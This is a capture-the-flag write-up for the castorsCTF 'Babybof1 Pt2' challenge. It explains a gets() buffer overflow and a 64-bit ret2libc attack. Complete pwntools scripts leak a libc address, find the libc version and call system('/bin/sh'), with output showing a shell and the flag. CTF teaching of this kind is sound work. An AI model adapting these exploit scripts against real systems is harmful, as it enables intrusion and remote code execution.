---
title: "Babybof1 Pt2"
date: 2020-06-15T20:58:24-04:00
draft: false 
toc: false
images:
tags:
  - ctf
  - writeup
  - security
---

## The Problem Description:  
![Problem Description](/problem.png)

## Ghidra Decompilation:
![Ghidra](/ghidra.png)

As we can see from the above decompilation, the vulnerability in the program is `gets()`.  
The call to gets() doesn't check to make sure our input will fit into the buffer we give it,  
so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.  
The gets() means we the input can contain any character, even \x00, except for newlines.

Let's check what kind of binary we have and what protections it has.  
```console
$ wget https://castorsctf20.ctfd.io/files/10d1b0797feecefc95e7660be8bbbab4/babybof?token=eyJ1c2VyX2lkIjo3MzMsInRlYW1faWQiOjMyMSwiZmlsZV9pZCI6MTExfQ.XtPiqA.baXDvvhSBLjPBNCcxZqEx05bqY8 -O bof
$ file bof
bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,  
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,  
BuildID[sha1]=53082227c9e25222032055ccb700576121bd384f, not stripped
$ checksec --file=bof
[*] 'bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```
The binary is a 64 bit ELF binary.
* Partial RELRO (Relocation Read-Only): PLT GOT entries are still writeable.
* No canary: We can safely overwrite the saved return address without worrying about overwriting a stack canary.
* NX disabled: The stack is executable, so we could use shellcode if we wanted.  
* No PIE: No ASLR in the binary itself, so addresses of functions like main will remain constant. However, the actual machine we run the binary on still will probably have ASLR enabled which means the stack addresses will change.  

First I tried using shellcode, but since ASLR is still enabled on the machine, the stack addresses will be randomized.  
This means that the address of the input buffer will change. I didn't know how to overwrite the return address with the correct address of the shellcode, so I just decided to use ret2libc. (Note: I think using shellcode was the intended solution and not ret2libc).  
Libc is a standard C library with all sort of useful functions. A ret2libc attack can take advantage of functions like system() in libc to spawn a shell.

The first step is to determine how much input we need to overwrite the return address.  
The stack should look like this for main().

```
[    Saved Return Address   ]
[ Saved Frame Pointer (EBP) ]
[         Buffer[255]       ]
[         Buffer[254]       ]
[         Buffer[253]       ]
       . . . . . . . . 
[         Buffer[2]         ]
[         Buffer[1]         ]
[         Buffer[0]         ]

```
We want to write past the buffer, overwrite the saved fram pointer, and then overwrite the saved return address our own address to our exploit.  
We know that the buffer is 256 bytes from Ghidra, so we can use the following to test how much padding we need until we overwrite the return address.  
In the diagram above, writing to buffer will make input go "up" the stack.  
```console
$ python -c 'print "A"*256 + "B"*8 + "C"*8 + "D"*8 + "E"*8' > /tmp/asdf # Saves output to a file
$ gdb ./bof
(gdb) r < /tmp/asdf # Runs with contents of asdf as the input 
Welcome to the cybercastors Babybof

Program received signal SIGSEGV, Segmentation fault.
0x000000000040078b in main ()
(gdb) x/i $rip
=> 0x40078b <main+62>:	req 
```
We receive a segfault when we the binary with our input. It seems we stop at the ret instruction in main.  
A ret instruction is like pop rip, so let's what the ret instruction was trying to get from the stack.  
```console
(gdb) x/gx $rsp
0x7fffffffdee8:	0x4343434343434343
```
It looks like the program was trying to return to the address `0x4343434343434343` which is probably why we got a segfault.  
Since 0x43 is an ascii C, we know that the stack will look like this after gets() is called:
```
[ Saved ret   CCCCCCCC        ]
[ Saved EBP   BBBBBBBB        ]
[ Buffer:     A*256           ]
```
Now we just have to replace CCCCCCCC with the address of our exploit. We'll use a ROP (Return Oriented Programming) Chain to accomplish this.  

## Ret2libc
I used [this](https://tasteofsecurity.com/security/ret2libc-unknown-libc/) as a template for my 64-bit ret2libc attacks. Check the post out since it explains the basics of ret2libc pretty well.  

### Leak Libc
First we need to leak a libc function address. ASLR is enabled on the machine, so the address of libc functions will be randomized. In order to know the address of system() and other libc functions, we need to first find the base address of libc.   
We can use puts or printf to leak the address of a libc function. Puts is easier to use though, so we'll use that in this challenge.  
We'll be leaking the address of the `__libc_start_main` function and then subtracting the offset to calculate the base of libc. Then using the base of libc we can calculate where system() and the "/bin/sh" string is.  

Here's our ROP chain:
```
[Address of pop rdi, ret] [Address of __libc_start_main entry] [Address of puts] 
```
64-bit calling conventions say that the first argument of a function should be in the rdi register.  
So our rop chain will put the address of the `__libc_start_main` entry into rdi and then call puts, printing out the address of `__libc_start_main`.

This is what the stack will look with our ROP chain:
```
[         Address of puts          ] 
[Address of __libc_start_main entry]
[      Address of pop rdi, ret     ]  
[      Buffer:     A*256           ]
```

Here's our script to leak `__libc_start_main`:
```python3
""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

from pwn import * # Import pwntools

p = remote("chals20.cybercastors.com", 14425) # Connect to the remote server
#p = process("./bof") # start the vuln binary
elf = ELF("./bof") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
MAIN = elf.symbols['main']
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = b"A"*256 + b"B"*8 #Overflow buffer until return address
# Create rop chain
rop = base +  p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

#Send our rop-chain payload
p.sendline(rop)

#Parse leaked address
print(p.recvline())
print(p.recvuntil("name: "))
received = p.recvline()
received = received.strip()
print(received)
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()
```

Let's run the script:
```console
$ python3 leak.py
[+] Opening connection to chals20.cybercastors.com on port 14425: Done
[*] 'bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './bof'
[*] puts@plt: 0x400590
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x4007f3
b'Welcome to the cybercastors Babybof\n'
b'Say your name: '
b'\xc0?m \xd7\x7f'
[*] Leaked libc address,  __libc_start_main: 0x7fd7206d3fc0
[*] Closed connection to chals20.cybercastors.com port 14425
```
We see that for this particular run, the address of `__libc_start_main` was 0x7fd7206d3fc0.  
We need to find out what version of libc is running on the server since different versions have different offsets between the base and functions.  

Luckily there's a tool that finds the right libc version for you based on the address of a libc function.

Download the database and tools [here](https://github.com/niklasb/libc-database) and then run the following:
```console
$ ./find __libc_start_main 0x7fd7206d3fc0 
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
```
This shows us that the server was using the libc6\_2.31-0ubuntu9\_amd64 version. We can use `download libc6_2.31-0ubuntu9_amd64` to download that libc version.  

Note: There is also an online libc database at [https://libc.blukat.me/], but it only works sometimes since its database probably isn't as comphrehensive.

### Exploit
We can use the pwntools python library to find libc offsets.  

This calculates the base libc address by subtracting the offset from \_\_libc\_start\_main
```python3
libc.address = leak - libc.sym["__libc_start_main"]
```

Then by using this libc base address we can find the addresses of system() and "/bin/sh" to spawn a shell.  
Using pwntools:
```python3
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
```

For our exploit, we need to be able to call main() twice: once to leak libc and another time to call system().  
We can just append the address of main() to our first ROP chain to accomplish this.  

First ROP chain:
```python3
base = b"A"*256 + b"B"*8 #Overflow buffer until return address
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)
```

Then our second rop chain will call system:
```python3
rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
```

Combine the above into a script:
```python3
""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

#!/usr/bin/python3

from pwn import * # Import pwntools

p = remote("chals20.cybercastors.com", 14425)
#p = process("./bof") # start the vuln binary
elf = ELF("./bof") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets
libc = ELF("./libc-2.31.so")

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = b"A"*256 + b"B"*8 #Overflow buffer until return address
# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)

#Send our rop-chain payload
p.sendline(rop)

#Parse leaked address
print(p.recvline())
print(p.recvuntil("name: "))
received = p.recvline()
received = received.strip()
print(received)
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
p.sendline(rop2)
p.interactive()
p.close()
```

Run the script:
```console
$ python3 exploit.py
[+] Opening connection to chals20.cybercastors.com on port 14425: Done
[*] '/home/user/castorsctf/babybof1pt2/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './bof'
[*] '/home/user/castorsctf/babybof1pt2/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts@plt: 0x400590
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x4007f3
b'Welcome to the cybercastors Babybof\n'
b'Say your name: '
b'\xc0\xef\xe2\xa4o\x7f'
[*] Leaked libc address,  __libc_start_main: 0x7f6fa4e2efc0
[*] Address of libc 0x7f6fa4e08000 
[*] bin/sh 0x7f6fa4fbf5aa 
[*] system 0x7f6fa4e5d410 
[*] Switching to interactive mode
Welcome to the cybercastors Babybof
Say your name: /bin/sh: 0: can't access tty; job control turned off
$ $ ls
babybof  flag.txt  shell_flag.txt
$ $ cat shell_flag.txt
castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
$ $  
```

Note: during the actual ctf, there was a weird buffering issue, so I had to run exploit_buf.py around 100 times to get a shell.  
Towards the end of the ctf, the organizers fixed the buffering issue, so running exploit.py just once will now work.

Also if you see any inaccuracies anywhere, feel free to [contact](mailto:jacobshin313@gmail.com) me!
